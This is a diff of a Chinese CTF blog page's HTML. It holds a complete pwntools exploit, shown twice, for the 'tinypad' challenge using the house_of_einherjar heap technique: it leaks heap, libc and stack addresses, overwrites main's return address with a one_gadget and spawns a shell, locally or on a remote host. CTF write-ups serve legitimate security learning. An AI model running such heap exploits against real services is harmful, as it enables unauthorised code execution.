-    <span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>     <span class=c1># avoid free error</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34; #   INDEX: 2</span><span class=se>\n</span><span class=s2> # CONTENT: &#34;</span><span class=p>)</span>
-    <span class=n>libc_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
-    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>-</span> <span class=mh>0x14CBC0</span>
-    <span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-
-    <span class=c1># gdb.attach(io, &#34;b *0x4009BC&#34;)</span>
-    <span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;environ&#34;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34; #   INDEX: 2</span><span class=se>\n</span><span class=s2> # CONTENT: &#34;</span><span class=p>)</span>
-    <span class=n>stack_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
-    <span class=n>mainret_addr</span> <span class=o>=</span> <span class=n>stack_addr</span> <span class=o>-</span> <span class=mh>0xf0</span>
-    <span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-
-    <span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>mainret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
-    <span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>one_gadget</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
-
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(CMD)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;Q&#34;</span><span class=p>)</span>
-
-    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
-
-
-<span class=n>argc</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span>
-<span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
-    <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
-<span class=k>else</span><span class=p>:</span>
-    <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
-        <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
-    <span class=k>elif</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
-        <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
-        <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
-    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
-<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
-<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>locallibc</span><span class=p>)</span>
-<span class=n>exp</span><span class=p>()</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id=reference>reference</h2>
-<ol>
-<li>how2heap house_of_einherjar.c</li>
-</ol>
-</div>
-<div class=post-copyright>
-<p class=copyright-item>
-<span class=item-title>文章作者</span>
-<span class=item-content>hhdx</span>
-</p>
-<p class=copyright-item>
-<span class=item-title>上次更新</span>
-<span class=item-content>
-2020-07-23
-</span>
-</p>
-</div>
-<footer class=post-footer>
-<div class=post-tags>
-<a href=/tags/ctf/>CTF</a>
-<a href=/tags/how2heap/>how2heap</a>
-</div>
-<nav class=post-nav>
-<a class=prev href=/post/how2heap-house-of-orange-hitcon2016-houseoforange/>
-<i class="iconfont icon-left"></i>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>localfile</span> <span class=o>=</span> <span class=s2>&#34;./tinypad&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>locallibc</span> <span class=o>=</span> <span class=s2>&#34;../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(CMD)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;A&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(SIZE)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(CONTENT)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(CMD)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;E&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(INDEX)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(CONTENT)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(Y/n)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;Y&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(CMD)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;D&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(INDEX)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>tinypad</span>    <span class=o>=</span> <span class=mh>0x602040</span>
+</span></span><span class=line><span class=cl>    <span class=n>one_gadget</span> <span class=o>=</span> <span class=mh>0x40d82</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># 1: 0x30</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># 2: 0x30</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># 3: 0x100</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># 4: 0x90</span>
+</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34; #   INDEX: 1</span><span class=se>\n</span><span class=s2> # CONTENT: &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>heap_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>heap_base</span> <span class=o>=</span> <span class=n>heap_addr</span> <span class=o>&amp;</span> <span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>fake_size</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x30</span> <span class=o>+</span> <span class=mh>0x30</span> <span class=o>-</span> <span class=n>tinypad</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                                 <span class=c1># 1: 0x100</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                                 <span class=c1># 2: 0x30</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x20</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>fake_size</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>     <span class=c1># 3: 0x30</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>fake_size</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>           <span class=c1># consolidate with top chunk, avoid malloc unsorted bin check error</span>
+</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0xe8</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&#34;strlen&#34;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>     <span class=c1># avoid free error</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34; #   INDEX: 2</span><span class=se>\n</span><span class=s2> # CONTENT: &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>libc_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>-</span> <span class=mh>0x14CBC0</span>
+</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b *0x4009BC&#34;)</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;environ&#34;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34; #   INDEX: 2</span><span class=se>\n</span><span class=s2> # CONTENT: &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>stack_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>mainret_addr</span> <span class=o>=</span> <span class=n>stack_addr</span> <span class=o>-</span> <span class=mh>0xf0</span>
+</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>mainret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>one_gadget</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(CMD)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;Q&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>argc</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>locallibc</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>exp</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=reference>reference</h2><ol><li>how2heap house_of_einherjar.c</li></ol></div><div class=post-copyright><p class=copyright-item><span class=item-title>文章作者</span>
+<span class=item-content>hhdx</span></p><p class=copyright-item><span class=item-title>上次更新</span>
+<span class=item-content>2020-07-23</span></p></div><footer class=post-footer><div class=post-tags><a href=/tags/ctf/>CTF</a>
+<a href=/tags/how2heap/>how2heap</a></div><nav class=post-nav><a class=prev href=/post/how2heap-house-of-orange-hitcon2016-houseoforange/><i class="iconfont icon-left"></i>
 <span class="prev-text nav-default">How2heap--house_of_orange Hitcon2016--houseoforange</span>
-<span class="prev-text nav-mobile">上一篇</span>
-</a>
-<a class=next href=/post/how2heap-large-bin-attack-0ctf2018-heapstorm2/>
-<span class="next-text nav-default">How2heap--large_bin_attack 0ctf2018--heapstorm2</span>
+<span class="prev-text nav-mobile">上一篇</span></a>
+<a class=next href=/post/how2heap-large-bin-attack-0ctf2018-heapstorm2/><span class="next-text nav-default">How2heap--large_bin_attack 0ctf2018--heapstorm2</span>
 <span class="next-text nav-mobile">下一篇</span>
-<i class="iconfont icon-right"></i>
-</a>
-</nav>
-</footer>
-</article>
-</div>
-<div id=disqus_thread></div>
-<script type=text/javascript>(function(){var a,b;if(window.location.hostname==='localhost')return;a=document.createElement('script'),a.type='text/javascript',a.async=!0,b='lyliuchao',a.src='//'+b+'.disqus.com/embed.js',(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(a)})()</script>
-<noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
-</div>
-</main>
-<footer id=footer class=footer>
-<div class=social-links>
-<a href=https://github.com/clxsh class="iconfont icon-github" title=github></a>
-<a href=https://www.douban.com/people/57285004/ class="iconfont icon-douban" title=douban></a>
-<a href=https://hhdx.xyz/index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a>
-</div>
-<div class=copyright>
-<span class=power-by>
-由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动
-</span>
+<i class="iconfont icon-right"></i></a></nav></footer></article></div><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname==="localhost")return;var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="lyliuchao",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div></main><footer id=footer class=footer><div class=social-links><a href=https://github.com/clxsh class="iconfont icon-github" title=github></a>
+<a href=https://www.douban.com/people/57285004/ class="iconfont icon-douban" title=douban></a></div><div class=copyright><span class=power-by>由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动</span>
 <span class=division>|</span>
-<span class=theme-info>
-主题 -
-<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a>
-</span>
-<span class=copyright-year>
-&copy;
+<span class=theme-info>主题 -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span>
+<span class=copyright-year>&copy;
 2016 -
-2021<span class=heart><i class="iconfont icon-heart"></i></span><span>hhdx</span>
-</span>
-</div>
-</footer>
-<div class=back-to-top id=back-to-top>
-<i class="iconfont icon-up"></i>
-</div>
-</div>
-<script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script>
+2023<span class=heart><i class="iconfont icon-heart"></i></span><span>hhdx</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js integrity=sha384-NXgwF8Kv9SSAr+jemKKcbvQsz+teULH/a5UNJvZc6kP47hZgl62M1vGnw6gHQhb1 crossorigin=anonymous></script>
 <script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
